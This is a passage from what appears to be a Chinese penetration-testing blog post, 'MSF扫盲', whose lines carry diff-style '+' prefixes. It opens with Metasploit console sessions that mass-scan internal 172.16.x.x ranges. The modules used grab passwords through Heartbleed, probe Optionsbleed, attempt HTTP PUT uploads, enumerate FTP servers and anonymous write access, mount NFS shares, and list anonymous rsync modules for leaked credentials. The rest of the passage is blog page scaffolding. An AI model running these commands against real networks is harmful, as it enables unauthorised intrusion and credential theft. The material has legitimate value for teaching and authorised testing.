+msf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65
+msf &gt; set rport 80
+msf &gt; set rport 8080
+msf &gt; set targeturi /cgi-bin/test.cgi
+msf &gt; run
+心脏滴血[循环抓密码]
+msf &gt; use auxiliary/scanner/http/apache_optionsbleed
+msf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65
+msf &gt; set rport 443
+msf &gt; set threads 3
+msf &gt; run
+尝试对内网 web 进行批量 put 利用尝试
+msf &gt; use auxiliary/scanner/http/http_put
+msf &gt; set rhosts 172.16.41.1-3,21-23,41-44,48,55,68,70,72,74-79,95,252 172.16.52.11,13-14,17,201 172.16.40.1-2,11-15 172.16.14.26,39,68,99,152,197,247,252,253 172.16.54.252 172.16.53.22,53,55,56,58,59,61-65
+msf &gt; set filedata session logs
+msf &gt; set filename tmp.txt
+msf &gt; set rport 80
+msf &gt; set rport 8080
+msf &gt; set threads 3
+msf &gt; run
+批量探测内网的下所有 ftp 种类及详细版本
+msf &gt; use auxiliary/scanner/ftp/ftp_version
+msf &gt; set rhosts 172.16.41.0/24 172.16.52.0/24 172.16.40.0/24 172.16.14.0/24 172.16.54.0/24 172.16.56.0/24 172.16.53.0/24
+msf &gt; set threads 5
+msf &gt; run
+[+] 172.16.41.72:21 - FTP Banner: &#39;220 Microsoft FTP Service\x0d\x0a&#39;
+[+] 172.16.14.152:21 - FTP Banner: &#39;220 (vsFTPd 2.0.7)\x0d\x0a&#39;
+[+] 172.16.14.253:21 - FTP Banner: &#39;220 (vsFTPd 2.2.2)\x0d\x0a&#39;
+[+] 172.16.53.59:21 - FTP Banner: &#39;220 Microsoft FTP Service\x0d\x0a&#39;
+接着,拿着上面已经获取到的所有 ftp server 的 ip 继续尝试批量匿名读写
+msf &gt; use auxiliary/scanner/ftp/anonymous
+msf &gt; set rhosts 172.16.41.72 172.16.14.152,253 172.16.53.59
+msf &gt; set threads 1
+msf &gt; run
+内网中尝试批量 nfs 挂载
+msf &gt; use auxiliary/scanner/nfs/nfsmount
+msf &gt; set rhosts 172.16.41.0/24 172.16.52.0/24 172.16.40.0/24 172.16.14.0/24 172.16.54.0/24 172.16.56.0/24 172.16.53.0/24
+msf &gt; set threads 5
+msf &gt; run
+批量探测内网可匿名访问的 rsync,通常情况下这些 rsync 都是做 web 的同步备份的,所以里面可能包含有大量目标站点的敏感信息[账号密码]
+msf &gt; use auxiliary/scanner/rsync/modules_list
+msf &gt; set rhosts 172.16.41.0/24 172.16.52.0/24 172.16.40.0/24 172.16.14.0/24 172.16.54.0/24 172.16.56.0/24 172.16.53.0/24
+msf &gt; set rport 873
+msf &gt; set threads 5
+msf &gt; run</code></pre><p><img src="/img/MSFLiteracy/9362ae5a-0f98-4195-adc2-cd6a173bba95.jpg" alt="img"></p>
+<p><img src="/img/MSFLiteracy/e440ad41-a1c4-4dd5-b2ca-d31257f26011.png" alt="img"></p>
+
+            </div>
+            <hr />
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《MSF扫盲》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/12/05/msf-sao-mang/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                ske
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'SkewwG.github.io',
+        owner: 'SkewwG',
+        admin: "SkewwG",
+        id: '2020/12/05/msf-sao-mang/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+    <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<!-- <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script> -->
+
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '',
+        appKey: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'false' === 'true',
+        avatar: 'wavatar',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '如果你没有GitHub账号，还可以在这里评论啦！'
+    });
+</script>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/12/05/msf-sao-mang/">
+                    <div class="card-image">
+                        
+                        <img src="/img/MSFLiteracy/e1eb34c1-9110-414d-8c76-130ba3178359.png" class="responsive-img" alt="MSF扫盲">
+                        
+                        <span class="card-title">MSF扫盲</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            MSF扫盲
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/MetasplotFramework/" class="post-category" target="_blank">
+                                    MetasplotFramework
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/MSF扫盲/" target="_blank">
+                        <span class="chip bg-color">MSF扫盲</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/">
+                    <div class="card-image">
+                        
+                        <img src="/img/officeMacro/34bfdf24-af9c-48e4-b118-cabb0d5056c0.png" class="responsive-img" alt="钓鱼与社工系列之office宏">
+                        
+                        <span class="card-title">钓鱼与社工系列之office宏</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            钓鱼与社工系列之office宏
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/钓鱼与社工/" class="post-category" target="_blank">
+                                    钓鱼与社工
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/钓鱼与社工系列之office宏/" target="_blank">
+                        <span class="chip bg-color">钓鱼与社工系列之office宏</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: ske的博客<br />'
+            + '作者: ske<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
+    });
+</script>
+
+    
+
+</main>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            &copy; 2020-~ Ske. 版权所有
+
+            
+            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+            <span class="white-color">22.2k</span>
+            
+
+            <br>
+            <span id="sitetime"></span>
+
+            
+            
+            <br>
+            
+			<span id="busuanzi_container_site_pv" style='display:none'>
+				<i class="fa fa-heart-o"></i>
+				
+			</span>
+			
+			
+			<span id="busuanzi_container_site_uv" style='display:none'>
+				
+			</span>
+			
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/SkewwG" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:446106525@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=446106525&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2020, 11, 25, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);
+        var pvcountOffset = 80000;
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int);
+            }
+        }
+    });
+</script>
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
+    </script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    
+    <script src="/libs/others/clicklove.js"></script>
+    
+
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+</body>
+
+</html>
